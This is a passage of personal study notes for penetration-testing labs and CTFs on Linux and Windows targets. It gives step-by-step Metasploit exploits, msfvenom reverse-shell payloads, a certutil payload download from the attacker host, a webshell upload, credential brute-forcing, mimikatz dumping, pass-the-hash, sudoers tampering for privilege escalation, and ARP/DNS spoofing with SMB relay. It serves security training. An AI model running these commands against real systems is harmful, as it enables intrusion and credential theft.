        nmap -sS -sV demo.ine.local
        nmap --script vuln -p 21 demo.ine.local
        /etc/init.d/postgresql start
        
        // We will start the postgresql database server on the attacker machine. We are starting postgresql to store all metasploit loot and other sensitive information from the target machine.
        
        msfconsole -q
        use exploit/unix/ftp/**proftpd_133c_backdoor**
        **set payload payload/cmd/unix/reverse**
        set RHOSTS demo.ine.local
        set LHOST 192.70.114.2
        exploit -z
        
        use post/linux/gather/hashdump
        set SESSION 1
        exploit
        
        use auxiliary/analyze/crack_linux
        set SHA512 true
        run
        
        ```
        
        In this lab, we exploited a vulnerable application, peformed a hash dump and cracked the hash as well, all using metasploit modules.
        
    - **CTF:02**
        
        System/host-based attacks target the underlying operating system or individual hosts within a network to compromise their security. These attacks exploit vulnerabilities in the system's configuration, software, or hardware to gain unauthorized access, escalate privileges, or disrupt the normal functioning of the host. Common techniques include exploiting unpatched software vulnerabilities, misconfigurations, weak passwords, and malware infections. Attackers may attempt to gain root or administrator privileges to manipulate or steal sensitive data, install backdoors, or cause system crashes. System/host-based attacks can lead to significant breaches if not detected and mitigated promptly, making it essential for organizations to regularly update software, implement strong security policies, and monitor for suspicious activity to protect their systems from these threats.
        
        This lab is designed to test your knowledge and skills in performing system/host-based attacks on Linux targets and identifying hidden information on a target machine.
        
        In this lab environment, you will be provided with GUI access to a Kali Linux machine. Two machines are accessible at **http://target1.ine.local** and **http://target2.ine.local**.
        
        **Objective:** Perform system/host-based attacks on the target and capture all the flags hidden within the environment.
        
        **Flags to Capture:**
        
        - **Flag 1**: Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.
        - **Flag 2**: In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.
        - **Flag 3**: Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.
        - **Flag 4**: The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.
        
        The best tools for this lab are:
        
        - Nmap
        - Burp Suite
        - Metasploit Framework
        
        ```bash
        **//Flag1**
        
        nmap -Pn -A -T4 target1.ine.local
        //80/tcp open  http    Apache httpd 2.4.6 ((Unix))
        
        http://target1.ine.local
        //redirect with browser.cgi (shellshock)
        
        msfconsole
        search cgi_
        use scanner/http/apache_mod_cgi_bash_env
        setg hosts target1.ine.local
        set TARGETURI /browser.cgi
        run
        //got website is vul to the shellshock exploit
        
        use exploit/multi/http/apache_mod_cgi_bash_env_exec
        set TARGETURI /browser.cgi
        set LHOST ip (ifconfig eth1)
        exploit
        
        meterpreter>shell
        cd /
        cat flag.txt
        
        **//Flag2**
        cd /opt/apache/htdocs/
        ls -la
        cat .flag.txt
        
        **//Flag3**
        
        nmap -Pn -A -T4 target2.ine.local
        searchsploit libssh
        
        msfconsole
        search libssh
        use 0    //auxiliary/scanner/ssh/libssh_auth_bypass
        show options
        setg rhosts target2.ine.local
        set **SPAWN_PTY true**
        run
        //got the sessions
        sessions 1
        //got the shell
        dir 
        cd home
        cd user
        dir
        cat flag.txt
        
        **//Flag4  suid prblm**
        
        cd /root
        cd /home/user
        /**/greetings** and **welcome** check binary
        To obtain our last flag, we need to elevate our privileges. As we observed while obtaining the third flag, the user directory contains two additional files: ‘greetings’ and ‘welcome.’ By using the file command, we can confirm that both are binaries. We can utilize these binaries to escalate our privileges.
        
        ./greetings       //denied
        file welcome 
        strings welcome       //greeting binary
        rm greetings
        cp /bin/bash greetings
        ls
        ./welcome                 //got root priv
        cd /root
        cat flag.txt
        
        ```
        
    
    - Windows
        
        Windows has various standard native services and protocols configured or not on a host. When active, they provide an attacker with an access vector.
        
        Microsoft IIS - 80/443
        
        **— MS ISS: Supported executable file extension: .asp  .aspx  .config  .php**
        
        WebDAV - 80/443 [davtest, cadaver, msfvenom]
        
        SMB - 443 [psexec]
        
        RDP - 3389
        
        Winrm - 5986/443 [crackmapexec, evil-winrm]
        
        - **Pic: Frequently exploited windows services**
            
            ![image.png](image.png)
            
        
        **Exploiting Windows Vulnerabilities** 
        
        - Exploiting WebDAV
            
            -Authentication in the form of **Username** and **Password**
            
            Check wheather webDAV has been configured to run on the IIS web server 
            
            Bruteforce the credentials for login 
            
            Upload a malicious .asp file that can execute arbitary commands or obtain a reverse shell on the target 
            
            Tools : Davtest, cadaver 
            
            - `nmap -sV -sC 10.3.26.115`
            - `nmap -p80 --script http-enum -sV 10.3.26.115`
            - Browser [http://10.3.26.115/webdav/](http://10.3.26.115/webdav/) - Login check
            - `hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.3.26.115 http-get /webdav/`
            - `davtest -url [http://10.3.26.115/webdav](http://10.3.26.115/webdav)`
            - `davtest -auth bob:password_123321 -url [http://10.3.26.115/webdav](http://10.3.26.115/webdav)` - Find out which file can be submitted
            - cadaver [http://10.3.26.115/webdav](http://10.3.26.115/webdav)
            - dav:/webdav/> put /usr/share/webshells/asp/webshell.asp - file upload using cadaver
            - Access the backdoor: [http://10.3.26.115/webdav/webshell.asp](http://10.3.26.115/webdav/webshell.asp) ****
            - Now type your command on the box and run , find flag
            
            Run:::: whoami, ipconfig,  **type C:\flag.txt**
            
                  WebDAV with Metasploit 
            
            - `nmap -p80 --script http-enum -sV 10.4.18.218`
            - `davtest -auth bob:password_123321 -url [http://10.4.18.218/webdav](http://10.4.18.218/webdav)`
            - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.80.4 LPORT=1234 -f asp > shell.asp`
            - `cadaver [http://10.4.18.218/webdav](http://10.4.18.218/webdav)`
            - `put /root/shell.asp`
            - `service postgresql start && msfconsole`
            - `use exploit/multi/handler`
            - `set payload windows/meterpreter/reverse_tcp`
            - `set LHOST 10.10.80.4`
            - `set LPORT 1234`
            - `run`
            - Browser [http://10.4.18.218/webdav](http://10.4.18.218/webdav)/shell.asp
            - Got **meterpreter session** > sysinfo,getuid
            
            **Another System:**
            
            - msf
            
            ```bash
            seach iis upload
            use 1
            show options
            set HttpUsername bob
            set HttpPassword password_123321
            show options
            set rhosts target_ip
            set PATH /webdav/metasploit.asp
            exploit
            // got the **meterpreter** session> 
            meterpreter>sysinfo, getuid
            web: http://ip/webdav
            
            //root@attackerdefence:# ls
            # cadaver http://ip/webdav
            Username: bob
            Password: 
            dav:/wevdav/> ls
            >put /root/shell.asp
            >help
            >delete shell.asp      //delete this shell.asp
            
            ```
            
        - **Exploiting SMB with Psexec**
            
            psexec is the lightweight telnet replacement developed by Microsoft. This allows you to execute processes on remote windows syatem using any users cred 
            
            Psexec authentication is performed via SMB
            
            - **Pic: SMB Authentication**
                
                ![image.png](image%201.png)
                
            
            `nmap -sV -sC 10.4.16.36`
            
            `service postgresql start && msfconsole`
            
            `//msfconsole`
            
            `search smb_login
            use auxiliary/scanner/smb/smb_login
            set RHOSTS 10.4.16.36
            set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
            set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
            set VERBOSE false
            exploit` - cred found
            
            [`psexec.py](http://psexec.py/) [Administrator@10.4.16.36](mailto:Administrator@10.4.16.36) cmd.exe`
            
            or
            
            `msfconsole
            search psexec
            use exploit/windows/smb/psexec
            set RHOSTS 10.4.16.36
            set SMBUser Administrator
            set SMBPass qwertyuiop
            exploit`
            
            got **meterpreter** session>sysinfo, getuid
            
            **EternalBlue: Exploiting Windows MS17-010 SMB Vulnerability** 
            
            **//manual system**
            
            ```bash
            
            ```
            
            **//automatic system with msf**
            
            `search eternalblue
            use exploit/windows/smb/ms17_010_eternalblue
            set RHOSTS 192.168.31.131
            exploit`
            
            got **meterpreter** session>sysinfo
            
        - **Exploiting RDP**
            
            `nmap -sV 10.4.18.131`
            
            output: Port: 3333/tcp Service:ssl/dec-notes?
            
            `msfconsole`
            
            `use auxiliary/scanner/rdp/rdp_scanner
            set RHOSTS 10.4.18.131
            set RPORT 3333
            run` - detected RDP 
            
            **Bruteforce RDP login** 
            
            `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt rdp://10.4.18.131 -s 3333`
            
            `xfreerdp /u:administrator /p:qwertyuiop /v:10.4.18.131:3333`
            
        - **BlueKeep: Exploiting Windows CVE-2019-0708 RDP Vulnerability**
            
            
            ```bash
            sudo nmap -p 3389 ip
            msfconsole
            search bluekeep
            use 0
            set rhosts ip
            run
            seach bluekeep
            use 1      exploit
            set rhosts ip
            exploit
            show targets
            set target 2
            exploit
            //meterpreter> sysinfo, getuid
            ```
            
        - **Exploiting Winrm**
            
            
            `nmap --top-ports 7000 10.4.30.175`
            
            `nmap -sV -p 5985 10.4.30.175`
            
            5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
            
            Bruteforce winrm `crackmapexec winrm 10.4.30.175 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt`
            
            `crackmapexec winrm 10.4.30.175 -u administrator -p tinkerbell -x "whoami"
            crackmapexec winrm 10.4.30.175 -u administrator -p tinkerbell -x "systeminfo"`
            
            get command shell `evil-winrm.rb -u administrator -p 'tinkerbell' -i 10.4.30.175` 
            
            c:/ whoim, ifconfig. net user
            
            Metasploit 
            
            `search winrm_script
            use exploit/windows/winrm/winrm_script_exec
            set RHOSTS 10.4.30.175
            set USERNAME administrator
            set PASSWORD tinkerbell
            set FORCE_VBS true
            exploit`
            
            got meterpreter session>sysinfo
            
        
        **Windows Privilege Escalation** 
        
        - Windows Kernal Exploits
            
            
            ```bash
            
            ```
            
            - Create payload `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.31.128 LPORT=4444 -f exe -o payload.exe`
            - Start server python3 -m http.server
            - Download payload.exe
            - `msfconsole`
            - `use exploit/multi/handler`
            - `set payload windows/x64/meterpreter/reverse_tcp`
            - `set LHOST 192.168.31.128`
            - `set LPORT 4444`
            - `run`
            - Got meterpreter session , run in it background
            
            Another way - Use Windows Exploit Suggester 
            
            `mkdir Windows-Exploit-Suggester
            cd Windows-Exploit-Suggester
            wget [https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py](https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/f34dcc186697ac58c54ebe1d32c7695e040d0ecb/windows-exploit-suggester.py)`
            
            `cd Windows-Exploit-Suggester
            python ./windows-exploit-suggester.py --update
            pip install xlrd --upgrade`
            
            Go to meterpreter session and upload an file 
            
            `cd C:\\
            mkdir temp
            cd temp\\`
            
            `upload 41015.exe
            shell
            .\41015.exe 7`
            
            Got system privilege :)
            
        - UAC Bypass
            
            github_link:: https://github.com/hfiref0x/UACME/blob/master/README.md
            
            - `nmap -sV -p 80 10.4.19.119`
            - Exploit rejetto
            - Got meterpreter
            - `getuid`
            - `pgrep explorer`
            - `migrate 2708`
            - `getprivs`
            - `shell`
            
            c:/
            
            - `net user`
            - `net localgroup administrators`
            - Access denied
            - Use UACMe Akagmi already present on the attack machine
            - `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.4.2 LPORT=1234 -f exe > backdoor.exe`
            - `use multi/handler`
            - `set payload windows/meterpreter/reverse_tcp`
            - `set LHOST 10.10.4.2`
            - `set LPORT 1234`
            - `run`
            - Go to old meterpreter session
            - `cd C:\\`
            - `mkdir Temp`
            - `cd Temp`
            - `upload /root/backdoor.exe`
            - `upload /root/Desktop/tools/UACME/Akagi64.exe`
            - `.\Akagi64.exe 23 C:\Temp\backdoor.exe` - run both
            - Now run getprivs
            - Got privilege escalation
            - Migrate to a `NT AUTHORITY\SYSTEM` service
            - ps -S lsass.exe
            - migrate 692
            - hashdump
        - Access Token Impersonation
            - `nmap -sV -p 80 10.4.22.75`
            - exploit rejetto
            - got meterpreter session
            - `pgrep explorer`
            - `getuid`
            - `load incognito`
            - `list_tokens -u`
            - `impersonate_token "ATTACKDEFENSE\Administrator”`
            - `prgerp explorer`
            - `getprivs`
            - `list_tokens -u`
            
            ```bash
            
            ```
            
            - `impersonate_token "NT AUTHORITY\SYSTEM”`
            - `cd C:\\Users\\Administrator\\Desktop\\` - flag
        
        **Windows File System Vulnerabilities**
        
        - Alternate Data Streams
            
            ADS: Alternate Data Streams NTFS: New Technology File System
            
            ```bash
            
            ```
            
        
        **Windows Credentials Dumping** 
        
        - **Unattented Files**
            - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.4.2 LPORT=1234 -f exe > payload.exe - create payload`
            - python -m SimpleHTTPServer 80 - setup the web server and host the payload
            
            c:\
            
            - `certutil -urlcache -f [http://10.10.4.2/payload.exe](http://10.10.4.2/payload.exe) payload.exe` - download the file to victim machine using certutil
            - `msfconsole -q`
            - `use multi/handler
            set payload windows/x64/meterpreter/reverse_tcp
            set LPORT 1234
            set LHOST 10.10.4.2
            run`
            - Execute the `payload.exe` on the Win target system and check the reverse shell on Kali
            - `cd C:\\Windows\\Panther`
            - `download unattend.xml`
            - open the unattend.xml file - found the admin password with base64 encode
            - Decode the password
            - Test the `administrator`:`Admin@123root` credentials with the `psexec` tool
            - [`psexec.py](http://psexec.py/) [administrator@10.4.19.9](mailto:administrator@10.4.19.9)`
            - `cd C:\Users\Administrator\Desktop`
            - `type flag.txt`
            
        - **Mimikatz & kiwi**
            
            Mimikatz will require elevated privileges in order to run correctly 
            
            - `nmap -sV -p 80 10.2.29.32`
            - Exploit badblue pattasu
            - Got meterpreter session
            - `sysinfo
            getuid
            pgrep lsass
            migrate 768`
            - **Hashdump - Kiwi**
            - `load kiwi`
            - `creds_all`
            - `lsa_dump_sam`
            - `lsa_dump_secrets`
            - **Hashdump Mimikatz**
            - `cd C:\\
            mkdir Temp
            cd Temp`
            meterpreter > `upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe`
            `shell`
            - `.\mimikatz.exe` - run mimikatz
            - `privilege::debug`
            - `lsadump::sam`
            - `lsadump::secrets`
            - `sekurlsa::logonPasswords`
            
        - **Pass the hash**
            - `nmap -sV -p 80 10.2.23.202`
            - Exploit badblue pattasu
            - Got meterpreter session
            - `pgrep lsass
            migrate 772
            getuid`
            - `load kiwi`
            - `lsa_dump_sam`
            - Copy and save the Administartor and students NTLM hashes
            - `hashdump`
            - LM+NTLM hash is necessary, so copy the string:
            - `background
            search psexec
            use exploit/windows/smb/psexec
            options`
            - `set LPORT 4422
            set RHOSTS 10.2.23.202
            set SMBUser Administrator
            set SMBPass aad3b435b51404eeaad3b435b51404ee:e3c61a68f1b89ee6c8ba9507378dc88d`
            - `exploit`
            - `getuid, sysinfo`
            - `crackmapexec smb 10.2.23.202 -u Administrator -H "e3c61a68f1b89ee6c8ba9507378dc88d" -x "whoami”`
        
    - **Linux**
        - **Pic: Exploited Linux Services**
            
            ![image.png](image%202.png)
            
        - **Exploiting Linux Vulnerabilities**
            
            **Shellshock** 
            
            - `nmap -sV 192.173.104.3`
            - Browse [http://192.173.104.3/gettime.cgi](http://192.173.104.3/gettime.cgi)
            - Vuln check - `nmap -sV --script=http-shellshock --script-args "http-shellshock.uri=/gettime.cgi" 192.173.104.3`
            
            //manually
            
            ```bash
            using burpsuite and nc -nlvp 1234
            ```
            
            //using msf
            
            - `msfconsole`
            - `search shellshock
            use exploit/multi/http/apache_mod_cgi_bash_env_exec
            set RHOSTS 192.173.104.3
            set TARGETURI /gettime.cgi
            exploit`
            
            **FTP**
            
            - `nmap -sV 192.209.45.3`
            - Bruteforce `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.209.45.3 -t 4 ftp`
            - `ftp 192.209.45.3`
            - `dir`
            - `get secret.txt`
            - `exit` / exit from ftp session
            - #ls
            - #cat secret.txt
            
            ```bash
            nmap -sV ip      //Version: ProFTPD
            searchsploit ProFTPD     //identifiy vul
            ```
            
            **SSH**
            
            - `nmap -sV 192.63.218.3`
            - Bruteforce `hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/common_passwords.txt 192.63.218.3 -t 4 ssh`
            - `ssh [sysadmin@192.63.218.3](mailto:sysadmin@192.63.218.3)`
            - `whoami`
            - `groups sysadmin`
            - `cat /etc*issue`
            - `uname -r`
            - `cat /etc/passwd`
            - `find / -name "flag”`
            - `cat /flag`
            
            **Samba**
            
            - `nmap -sV 192.34.128.3`
            - Bruteforce `hydra -l admin -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt 192.34.128.3 smb`
            - `smbmap -H 192.34.128.3 -u admin -p password1`
            - `man smbclient`
            - `smbclient -L 192.34.128.3 -U admin`
            - dir , cd hidden\, dir , get flag.tar.gz. exit, tar xzf flag.tar.gz, ls , cat flag
            - `smbclient [//192.34.128.3/shawn](https://192.34.128.3/shawn) -U admin`
            - `smbclient [//192.34.128.3/nancy](https://192.34.128.3/nancy) -U admin`
            - `smb:\>?` or dir
            - smb: cd srv ,  get flag , exit , ls , cat flag
            - `enum4linux -a 192.34.128.3`  -a for all info
            - `enum4linux -a -u admin -p password1 192.34.128.3`
            - get flag
        - **Linux Privilege Escalation**
            - Linux Kernel Exploitation
                
                ```bash
                //metepreter
                sysinfo
                getuid
                shell      //verify this
                cat /etc/passwd
                sudo apt-get update
                ctrl+z
                ...download file
                cd /tmp
                ls
                upload ~/Desktop/Linux_Enum/les.sh
                shell
                ./les.sh
                //impt info : kernel version
                download for exploitdb : dirtycow from impt info
                $sudo apt-get install gcc
                cd Dowload
                ls
                mv 40839.c dirty.c
                ls
                gcc -pthred dirty.c -o -lcrypt
                ls
                //show drity and dirty.c
                
                /tmp$
                terminate this channel
                meterpreter> upload ~/Download/dirty
                shell
                chmod +x dirty
                ./dirty password123
                //terminate
                meterpreter>upload ~/Download/dirty.c
                shell
                gcc -pthred dirty.c -o dirty -lcrypt         //from exploid-db
                 ls
                 chmod +x dirty
                 ./dirty password123
                 cat /etc/passwd
                 su firefart
                 
                 $ssh firefart@ip
                 ssh-keygen -f "/home/kali.ssh/known_hosts" -R "ip"
                 ssh firefart@ip
                 ///got the firefat session
                 sudo apt-get update
                 apt-get update
                 whoami
                 cat /etc/shadow
                 // that is how to elevate linux karnel 
                ```
                
            
            **Cron jobs**
            
            - `whoami
            groups student
            cat /etc/passwd
            crontab -l`
            - ls -al
            - cat message       //permission denied
            - pwd
            - `cd /`
            - `grep -rnw /usr -e "/home/student/message"`
            - `grep -rnw /usr/local/share/copy.sh:2:cp /home/student/message /tmp/message`
            - ls -al /tmp
            - cat /tmp/message
            - `ls -al /usr/local/share/copy.sh`
            - cat /usr/local/share/copy.sh
            - `printf '#!/bin/bash\necho "student ALL=NOPASSWD:ALL" >> /etc/sudoers' > /usr/local/share/copy.sh`
            - `cat /usr/local/share/copy.sh`
            - `echo "student ALL=NOPASSWD:ALL" >> /etc/sudoers`
            - `sudo -l`
            - `sudo su`
            - whoami
            - cd /root
            - ls
            - cat flag
            - Got root priviledges
            - get the flag
            
            **SUID**
            
            ```bash
            pwd
            ls -al         //check binary
            ./greetings              //permission denied
            file welcome
            strings welcome                //greeting binary got this
            rm greetings
            cp /bin/bash greetins
            ls
            ./welcome             //root priv
            cat /etc/shadow
            ```
            
            - `pwd`
            - `la -al`
            - identify that welcome file have s binaries specifies
            - `find welcome`
            - `strings welcome`
            - `rm greetings
            cp /bin/bash greetings
            ./welcome`
            - `cd /root`
            - `cat flag`
        - **Linux Credentials Dumping**
            - `nmap -sV 192.75.64.3`    //version
            - seachsploit ProFTPD       //backdoor command executable (msf)
            - `service postgresql start && msfconsole -q`
            - `setg RHOSTS 192.75.64.3
            search proftpd
            use exploit/unix/ftp/proftpd_133c_backdoor
            run`
            - `/bin/bash -i`
            - id
            - //ctrl + z
            - sessions
            - Upgrade the sessions to a `meterpreter` session
            - `sessions -u 1`    // u  means upgrade
            - `sessions 2`
            - `cat /etc/shadow`
            - Gather Linux Password hashes with `Metasploit` root user
            - `search hashdump      // msf module
            use post/linux/gather/hashdump
            set SESSION 2
            run`
            - `search crack
            use auxiliary/analyze/crack_linux
            set SHA512 true
            run`
            
        
- ***Network Based Attacks***
    
    
    **Labs:**
    
    - **NetBIOS Hacking (SMB & NetBios enum)**
        
        You will learn to enumerate the SMB service and exploit it using different brute-forcing and exploitation tools. Also, it covers pivoting and how to leverage net utility to mount the shared drives in the pivot network.
        
        In this lab environment, the user will access a Kali GUI instance. A vulnerable SMB service can be accessed using the tools installed on Kali on [http://demo.ine.local] and [http://demo1.ine.local.]
        
        **Objective:** Exploit both the target and find the flag!
        
        **Tools: msf, nmap, hydra, proxychains**
        
        WannaCry, a well-known ransomware attack, exploited vulnerabilities in the SMBv1 protocol to infect other systems
        
        ```bash
        ping -c 5 demo.ine.local    //reachable
        ping -c 5 demo1.ine.local
        nmap demo.ine.local
        
        #By default, the SMB service uses either IP port 139 or 445. Also, it is by default installed and present in every windows operating system. However, we can disable or remove it from the system.
        
        nmap -sV -p 139,445 demo.ine.local
        
        #identified that the target is Microsoft Windows Server 2008 R2 - 2012
        nmap -p445 --script smb-protocols demo.ine.local
        #We can notice that all three versions are accessible.
        
        nmap -p445 --script smb-security-mode demo.ine.local
        #There is one more interesting nmap script for the smb protocol to find the security level of the protocol.
        
        smbclient -L demo.ine.local
        Password for [WORKGROUP\root]: <enter>
        # we can access anonymous login Now, we have anonymous access to the target machine. We can smoothly dump all the present windows users using the nmap script.
        nmap -p445 --script smb-enum-users.nse demo.ine.local
        #There are a total of four users present. admin, administrator, root, and guest
        #Now, let's find the valid password for admin, administrator, and root user.
        nano users.txt
        admin
        administrator
        root
        cat users.txt
        hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
        #-L list of users & -P password
        #successfully retrieved 3 users pass
        #Now, we can use the Metasploit framework and run the psexec exploit module to gain the meterpreter shell using the administrator user valid password.
        
        msfconsole -q
        use exploit/windows/smb/psexec
        set RHOSTS demo.ine.local
        set SMBUser administrator
        set SMBPass password1
        exploit
        
        meterpreter>getuid, sysinfo
        cat C:\\Users\\Administrator\\Documents\\FLAG1.txt
        
        #demo.ine.local: 10.0.19.243
        #demo1.ine.local : 10.0.28.125
        
        shell
        ping 10.0.28.125
        
        #We can access the demo1.ine.local machine, i.e., 10.0.28.125.
        However, we cannot access that machine (10.0.28.125) from the Kali machine. So, here we need to perform **pivoting by adding route** from the Metasploit framework.
        
        CTRL + C
        y
        run autoroute -s 10.0.28.125**/20**
        #we have successfully added the route to access the demo1.ine.local machine
        cat /etc/proxychains4.conf
        #we can notice socks4 port 9050
        
        background
        use auxiliary/server/socks_proxy
        show options
        
        set SRVPORT 9050
        set VERSION 4a 
        exploit
        jobs
        #the server is running perfectly
        #Now, let's run nmap with proxychains to identify SMB port (445) on the pivot machine, i.e. demo1.ine.local
        We could also specify multiple ports. But, in this case, we are only interested in SMB service.
        
        proxychains nmap demo1.ine.local -sT -Pn -sV -p 445
        #Proxychains: a Linux tool that forces any program’s network connections through a configured chain of proxies (SOCKS4/5, HTTP) by preloading a redirect library to anonymize or route traffic.
        #445 port is open
        
        msf6 auxiliary(server/socks_proxy)>
        sessions -i 1
        shell
        net view 10.0.28.125           //access is denied
        #Well, currently, we are running as NT AUTHORITY\SYSTEM privilege. Let's migrate the process into explorer.exe and reaccess it.
        
        CTRL + C
        migrate -N explorer.exe
        shell
        net view 10.0.28.125
        #two shared resources Documents and K drive
        net use D: \\10.0.28.125\Documents
        net use K: \\10.0.28.125\K$
        #We successfully mapped the resources to D and K drives.
        
        dir D:
        dir K:
        
        CTRL + C
        cat D:\\Confidential.txt
        cat D:\\FLAG2.txt
        S
        ```
        
        This file is the ultimate proof for the client. The organization files are not safe. Therefore, policies and proper configurations should be implemented inside and outside the perimeter.
        
    - **SNMP Analysis**
        
        In this lab, you will learn to scan the target machine to discover SNMP service and perform information gathering using SNMP nmap scripts and other tools.
        
        In this lab, you will learn to scan the target machine to discover SNMP service and perform information gathering using SNMP nmap scripts and other tools.
        
        **Tools: nmap, msf, snmpwalk , hydra**
        
        ```bash
        
        ping -c 5 demo.ine.local
        nmap demo.ine.local
                                    #
        #We must keep in mind that nmap does not check for UDP ports by default. As we already know, SNMP runs on the UDP port 161.
        nmap **-sU -p 161** demo.ine.local
        #UDP port 161 is open. This information is crucial for our following tasks.
        #We could use nmap snmp-brute script to find the community string. The script uses the snmpcommunities.lst list for brute-forcing it is located inside /usr/share/nmap/nselib/data/snmpcommunities.lst directory.
        
        nmap -sU -p 161 --script=snmp-brute demo.ine.local
        #community names: public, private, and secret.
         #let's run the snmpwalk tool to find all the information via SNMP.
         #snmpwalk: snmpwalk is an SNMP application that uses SNMP GETNEXT requests to query a network entity for a tree of information. An object identifier (OID) may be given on the command line
        snmpwalk -v 1 -c public demo.ine.local  //-c community string -v version
        nmap -sU -p 161 --script snmp-* demo.ine.local > snmp_output
        ls
        nano users.txt      administrator, admin
        hydra -L users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt demo.ine.local smb
        #run the psexec Metasploit exploit module to gain the meterpreter session using these credentials.
        #PSExec (Microsoft Windows Authenticated User Code Execution): This module uses a valid administrator username and password (or password hash) to execute an arbitrary payload. This module is similar to the "psexec" utility provided by SysInternals.
        
        msfconsole -q
        use exploit/windows/smb/psexec
        show options
        set RHOSTS demo.ine.local
        set SMBUSER administrator
        set SMBPASS elizabeth
        exploit
        meterpreter>
        shell
        cd C:\
        dir
        type FLAG1.txt
        ```
        
        We have successfully exploited the target machine by extracting information via the SNMP service.
        
    - **DNS & SMB Relay Attack*****
        
        Launch an attack using the **SMB Relay Exploit** in a way that once the Client (**172.16.5.5**) issues a **SMB** connection to any hosts on the ***.sportsfoo.com** domain it can be redirected to your Metasploit server, and then you can use its credentials to get a shell on the target machine (172.16.5.10**).
        
        - graphic representation
            
            ![image.png](image%203.png)
            
            ![image.png](image%204.png)
            
        
        You are hired by a small company to perform a security assessment. Your customer is **sportsfoo.com** and they want your help to test the security of their environment, according to the scope below:
        
        **The assumptions of this security engagement are:**
        
        1. You are going to do an internal penetration test, where you will be connected directly into their LAN network **172.16.5.0/24**. The scope in this test is only the **172.16.5.0/24** segment
        2. You are in a production network, so you should not lock any user account by guessing their usernames and passwords
        
        Goals:
        
        - Exploitation using **SMB Relay Attack**
        - Manipulating network traffic with **dnsspoof**
        
        Tools: dnsspoof, msf
        
        ```bash
        msfconsole
        use exploit/windows/smb/smb_relay
        set SRVHOST 172.16.5.101
        set PAYLOAD windows/meterpreter/reverse_tcp
        set LHOST 172.16.5.101
        set SMBHOST 172.16.5.10
        exploit
        
        #Configure
        dnsspoof
        in order to redirect the victim to our Metasploit system every time there's an SMB connection to any host in the domain:
        sportsfoo.com
        . Create a file with fake dns entry with all subdomains of
        sportsfoo.com
        pointing to our attacker machine.
        
        echo "172.16.5.101 *.sportsfoo.com" > dns
        dnsspoof -i eth1 -f dns
        
        //#Activate the
        MiTM
        attack using the
        ARP Spoofing
        technique. Our goal is to poison the traffic between our victim,
        Windows 7
        at
        172.16.5.5
        , and the default gateway at
        172.16.5.1
        . In this way, we can manipulate the traffic using
        dnsspoof
        , which is already running. In order to perform an
        ARP Spoofing
        attack, we need to enable the IP forwarding as follow://
        
        echo 1 > /proc/sys/net/ipv4/ip_forward
        arpspoof -i eth1 -t 172.16.5.5 172.16.5.1
        arpspoof -i eth1 -t 172.16.5.1 172.16.5.5
        dnsspoof -i eth1 -f dns
        
        sessions
        sessions -i 1
        getuid
        ```
        
        In this lab, we were able to trick the client by spoofing DNS records, this, in turn, combined with SMB relay attack, provided us with a meterpreter session on the target machine with administrative privileges.
        
    - **CTF 1**
        
        Network and host-based penetration testing often involves analysing and uncovering details about services, vulnerabilities, and potential points of compromise. This lab focuses on post-exploitation activities such as analysing traffic to identify malicious activity, investigating infected hosts, and extracting critical information using forensic techniques.
        
        In this scenario, a network has been compromised, and your objective is to analyze captured network traffic to extract key information about the attack. You will use tools like Wireshark to examine network activity and identify malicious actions, affected systems, and associated artifacts.
        
        This lab emphasizes the importance of network forensics in identifying indicators of compromise and investigating incidents for effective incident response.
        
        In this lab environment, you will have GUI access to a Kali machine with access to a captured network packet file **test.pcap**.
        
        **Objective:** Use network analysis techniques to identify and capture the following flags related to the infection and attack:
        
        **Flag 1:** What is the domain name(abcd.site) accessed by the infected user that returned a 200 OK response code?
        
        **Flag 2:** What is the IP address, MAC address of the infected Windows client?
        
        **Flag 3:** Which Wireshark filter can you use to determine the victim’s hostname from NetBIOS Name Service traffic, and what is the detected hostname for this malware infection?
        
        **Flag 4:** Which user got infected and ran the mystery_file.ps1 PowerShell script?
        
        **Flag 5:** What User-Agent string indicates the traffic generated by a PowerShell script?
        
        **Flag 6:** Which wallet extension ID is associated with the Coinbase wallet?
        
        tools; wireshark
        
        ```bash
        **//Flag1**
        #open test.pcap
        Wireshark filter: http.response.code == 200
        FLAG 1: 623start.site
        
        **//Flag2**
        
        Wireshark: http
        FLAG 2: 10.7.10.47, 80:86:5b:ab:1e:c4
        
        **//Flag3**
        
        Wireshark filter used is: nbns
        FLAG 3: nbns, DESKTOP-9PEA63H
        
        **//Flag4**
        
        #To find this, clear all the filters and press CTRL+F to search.
        #Change the Display Filter to String and enter the file name you are looking for: mystery_file.ps1. Then, search using Packet bytes on the left side of the Find functionality and click on find.
        #selecting as Printable text
        #Paste the content into a text editor, like Notepad, to enumerate. After enumerating, we find the user, which is: rwalters.
        Press enter or click to view image in full size
        FLAG 4: rwalters
        
        //Flag5
        
        #To find this, press CTRL+F to search. In the String parameter, type PowerShell, and search using Packet Details on the left side of the Find functionality.
